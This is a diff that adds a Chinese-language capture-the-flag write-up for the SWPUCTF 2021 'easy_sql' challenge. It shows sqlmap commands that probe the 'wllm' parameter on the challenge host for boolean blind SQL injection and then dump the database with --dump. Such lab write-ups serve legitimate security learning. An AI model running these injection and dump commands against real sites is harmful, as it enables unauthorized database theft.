@@ -466,3 +466,26 @@ printenv
 ![](./img/fenjing2.png)
 
 ---
+
+## [SWPUCTF 2021 新生赛]easy_sql
+
+https://www.nssctf.cn/problem/387
+
+* 考点：sql注入
+* 工具：sqlmap
+
+进入题目的网页后可以发现网页标题已经告诉了你注入的参数是`wllm`，所以接下来可以直接使用`sqlmap`扫描尝试注入
+```shell
+python .\sqlmap.py -u http://node7.anna.nssctf.cn:29274/index.php?wllm=1
+```
+
+![](./img/easysql_sqlmap扫描结果.png)
+
+根据扫描结果可知存在`bool盲注`，直接使用--dump参数查看数据库内容
+```shell
+python .\sqlmap.py -u http://node7.anna.nssctf.cn:29274/index.php?wllm=1 --dump
+```
+
+![](./img/查看数据库结果.png)
+
+---
